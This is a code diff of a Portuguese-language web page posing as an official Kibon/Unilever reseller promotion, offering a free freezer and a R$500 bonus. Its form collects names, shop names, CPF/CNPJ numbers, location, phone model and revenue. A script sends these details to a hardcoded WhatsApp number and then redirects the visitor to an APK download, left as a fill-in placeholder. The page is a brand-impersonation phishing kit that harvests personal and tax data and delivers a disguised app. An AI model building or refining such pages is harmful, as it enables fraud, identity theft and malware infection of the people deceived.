@@ -3,135 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KIBON - Credenciamento e Bônus</title>
+    <title>KIBON OFICIAL</title>
     <style>
-        /* RESET E CORES OFICIAIS */
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Arial Black', sans-serif; }
-        body { background-color: #E2001A; padding: 10px; display: flex; flex-direction: column; align-items: center; }
-        
-        /* CABEÇALHO GIGANTE */
-        .header { text-align: center; padding: 30px 0 10px; color: white; width: 100%; }
-        .logo-kibon { font-size: 80px; font-weight: 900; letter-spacing: -6px; line-height: 0.9; margin: 0; text-shadow: 4px 4px 0px rgba(0,0,0,0.2); }
-        .promo-tag { background: #FFD700; color: #E2001A; padding: 8px 25px; border-radius: 50px; font-weight: 900; display: inline-block; transform: rotate(-2deg); box-shadow: 3px 3px 0px #000; margin-top: 10px; font-size: 14px; }
-
-        /* BOX DE OFERTA ATACADO */
-        .oferta-box { background: #000; border: 3px solid #FFD700; border-radius: 20px; margin: 20px 0; padding: 20px; text-align: center; color: white; width: 100%; max-width: 480px; }
-        .preco-atacado { font-size: 55px; font-weight: 900; color: #fff; display: block; line-height: 1; }
-        .freezer-txt { color: #FFD700; font-size: 13px; font-weight: bold; text-transform: uppercase; margin-top: 10px; border-top: 1px solid #333; padding-top: 10px; }
-
-        /* CARD DO FORMULÁRIO */
-        .container-form { background: white; border-radius: 30px; padding: 25px; color: #333; width: 100%; max-width: 480px; box-shadow: 0 15px 40px rgba(0,0,0,0.4); text-align: left; }
-        h2 { text-align: center; font-size: 18px; color: #E2001A; margin-bottom: 20px; text-transform: uppercase; font-weight: 900; }
-        
-        .field { margin-bottom: 15px; }
-        label { display: block; font-size: 10px; font-weight: bold; color: #777; margin-bottom: 4px; text-transform: uppercase; font-family: sans-serif; }
-        input, select { width: 100%; padding: 14px; border: 2px solid #eee; border-radius: 12px; font-size: 15px; outline: none; font-family: sans-serif; font-weight: bold; }
-        input:focus { border-color: #E2001A; background: #fffcfc; }
-        
-        .erro-alerta { color: #ff4d4d; font-size: 11px; font-weight: bold; display: none; margin-top: 5px; text-align: center; }
-
-        .btn-resgatar { width: 100%; padding: 22px; background: #E2001A; color: white; border: none; border-radius: 100px; font-size: 18px; font-weight: 900; cursor: pointer; box-shadow: 0 8px 20px rgba(226, 0, 26, 0.3); transition: 0.3s; margin-top: 10px; }
-        .btn-resgatar:hover { transform: scale(1.02); filter: brightness(1.1); }
-
-        .footer-legal { text-align: center; font-size: 10px; color: rgba(255,255,255,0.8); margin: 25px 0; font-family: sans-serif; width: 100%; }
+        body { background: #E2001A; color: white; text-align: center; padding: 20px; }
+        .logo { font-size: 65px; font-weight: 900; letter-spacing: -5px; margin: 10px 0; }
+        .tag { background: #FFD700; color: #E2001A; padding: 5px 15px; border-radius: 50px; font-weight: 900; display: inline-block; margin-bottom: 20px; }
+        .box { background: #000; border: 2px solid #FFD700; border-radius: 20px; padding: 15px; margin-bottom: 20px; }
+        .card { background: white; color: #333; border-radius: 25px; padding: 20px; text-align: left; max-width: 450px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+        label { display: block; font-size: 10px; font-weight: bold; color: #777; margin-bottom: 3px; text-transform: uppercase; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 10px; font-size: 14px; margin-bottom: 12px; outline: none; font-weight: bold; }
+        .btn { width: 100%; padding: 18px; background: #E2001A; color: white; border: none; border-radius: 50px; font-size: 16px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
+        .erro { color: red; font-size: 11px; display: none; font-weight: bold; margin-bottom: 10px; }
     </style>
 </head>
 <body>
-
-    <div class="header">
-        <h1 class="logo-kibon">KIBON</h1>
-        <div class="promo-tag">PROMOÇÃO KILOUCURA 2026</div>
+    <h1 class="logo">KIBON</h1>
+    <div class="tag">PROMOÇÃO KILOUCURA</div>
+    <div class="box">
+        <p style="font-size: 40px; font-weight: 900;">R$ 0,59</p>
+        <p style="color: #FFD700; font-size: 12px;">FREEZER GRÁTIS + R$ 500 BÔNUS</p>
     </div>
-
-    <div class="oferta-box">
-        <p style="font-size: 11px; color: #FFD700; letter-spacing: 2px; font-weight: bold;">PREÇO EXCLUSIVO REVENDA</p>
-        <span class="preco-atacado">R$ 0,59 <small style="font-size: 18px;">un.</small></span>
-        <div class="freezer-txt">🎁 GANHE O FREEZER + R$ 500 DE BÔNUS NO PRIMEIRO PEDIDO</div>
+    <div class="card">
+        <label>Nome do Responsável</label><input type="text" id="nome">
+        <label>Nome do Comércio</label><input type="text" id="loja">
+        <label>CPF ou CNPJ (Somente números)</label><input type="text" id="doc" maxlength="14">
+        <div id="ed" class="erro">⚠️ DOCUMENTO INVÁLIDO!</div>
+        <div style="display:flex; gap:10px;">
+            <select id="uf" style="flex:1;"><option value="">UF</option><option value="SP">SP</option><option value="RJ">RJ</option><option value="MG">MG</option><option value="RS">RS</option><option value="PR">PR</option><option value="SC">SC</option></select>
+            <input type="text" id="cid" placeholder="Cidade" style="flex:2;">
+        </div>
+        <label>Modelo do Celular</label>
+        <select id="cel"><option value="">Selecione...</option><option value="Samsung">Samsung</option><option value="iPhone">iPhone</option><option value="Motorola">Motorola</option><option value="Xiaomi">Xiaomi</option></select>
+        <label>Faturamento Mensal</label>
+        <select id="fat"><option value="">Selecione...</option><option value="Ate 5k">Até R$ 5.000</option><option value="Acima 5k">Acima de R$ 5.000</option></select>
+        <button class="btn" onclick="enviar()">RESGATAR BÔNUS E FREEZER</button>
     </div>
-
-    <div class="container-form">
-        <h2>Ficha de Credenciamento</h2>
-        
-        <div class="field">
-            <label>Nome do Responsável / Titular</label>
-            <input type="text" id="nome" placeholder="Seu Nome Completo">
-        </div>
-
-        <div class="field">
-            <label>Nome Fantasia do Comércio</label>
-            <input type="text" id="loja" placeholder="Nome da sua Loja">
-        </div>
-
-        <div class="field">
-            <label>CPF ou CNPJ (Somente números)</label>
-            <input type="text" id="doc" placeholder="000.000.000-00" maxlength="14">
-            <p id="msgErro" class="erro-alerta">⚠️ DOCUMENTO INVÁLIDO OU INCOMPLETO</p>
-        </div>
-
-        <div style="display: flex; gap: 10px;">
-            <div class="field" style="flex: 1;">
-                <label>UF</label>
-                <select id="uf">
-                    <option value="">--</option><option value="AC">AC</option><option value="AL">AL</option><option value="AP">AP</option><option value="AM">AM</option><option value="BA">BA</option><option value="CE">CE</option><option value="DF">DF</option><option value="ES">ES</option><option value="GO">GO</option><option value="MA">MA</option><option value="MT">MT</option><option value="MS">MS</option><option value="MG">MG</option><option value="PA">PA</option><option value="PB">PB</option><option value="PR">PR</option><option value="PE">PE</option><option value="PI">PI</option><option value="RJ">RJ</option><option value="RN">RN</option><option value="RS">RS</option><option value="RO">RO</option><option value="RR">RR</option><option value="SC">SC</option><option value="SP">SP</option><option value="SE">SE</option><option value="TO">TO</option>
-                </select>
-            </div>
-            <div class="field" style="flex: 2;">
-                <label>Cidade</label>
-                <input type="text" id="cid" placeholder="Sua Cidade">
-            </div>
-        </div>
-
-        <div class="field">
-            <label>Modelo do Aparelho Celular</label>
-            <select id="cel">
-                <option value="">Selecione...</option>
-                <option value="Samsung">Samsung Galaxy (Todos)</option>
-                <option value="iPhone">Apple iPhone (Todos)</option>
-                <option value="Motorola">Motorola Moto</option>
-                <option value="Xiaomi">Xiaomi Redmi / Poco</option>
-                <option value="Outro">Outro Modelo</option>
-            </select>
-        </div>
-
-        <div class="field">
-            <label>Faturamento Mensal Estimado</label>
-            <select id="fat">
-                <option value="">Faixa de faturamento...</option>
-                <option value="Ate 5k">Até R$ 5.000,00</option>
-                <option value="5k a 15k">R$ 5.000 a R$ 15.000</option>
-                <option value="Acima 15k">Acima de R$ 15.000,00</option>
-            </select>
-        </div>
-
-        <button class="btn-resgatar" onclick="processar()">CONCLUIR E RESGATAR TUDO</button>
-    </div>
-
-    <p class="footer-legal">DISTRIBUIÇÃO NACIONAL UNILEVER BRASIL © 2026<br>PROJETO DE EXPANSÃO DE PONTOS DE VENDA</p>
-
     <script>
-        function processar() {
-            const telDono = "5554999422678";
-            // SUBSTITUA O LINK ABAIXO PELO SEU LINK REAL DO APK
-            const linkDownload = "LINK_DO_SEU_APK_AQUI"; 
-
+        function enviar() {
             const doc = document.getElementById('doc').value.replace(/\D/g, '');
-            const nome = document.getElementById('nome').value;
-            const loja = document.getElementById('loja').value;
-            const cid = document.getElementById('cid').value;
-            const uf = document.getElementById('uf').value;
-            const cel = document.getElementById('cel').value;
-            const fat = document.getElementById('fat').value;
-
-            // Validação simples de CPF/CNPJ
-            if (doc.length !== 11 && doc.length !== 14) {
-                document.getElementById('msgErro').style.display = 'block';
-                alert("⚠️ Erro no Sistema: Documento Inválido. Digite apenas os números.");
-                return;
-            }
-
-            if (!nome || !loja || !cid || !uf || !cel || !fat) {
-                alert("Atenção: Todos os campos devem ser preenchidos para liberar o Freezer e o Bônus.");
-                return;
-            }
-
-            const mensagemZap = `*CADASTRO REVENDA KIBON OFICIAL*%0A--------------------------%0A*Tit
+            if (doc.length !== 11 && doc.length !== 14) { document.getElementById('ed').style.display='block'; return; }
+            const msg = `*REVENDA KIBON*%0A*Loja:* ${document.getElementById('loja').value}%0A*Doc:* ${doc}%0A*Cel:* ${document.getElementById('cel').value}`;
+            window.open(`https://api.whatsapp.com/send?phone=5554999422678&text=${msg}`, '_blank');
+            setTimeout(() => { window.location.href="LINK_DO_SEU_APK_AQUI"; }, 1000);
+        }
+    </script>
+</body>
+</html>
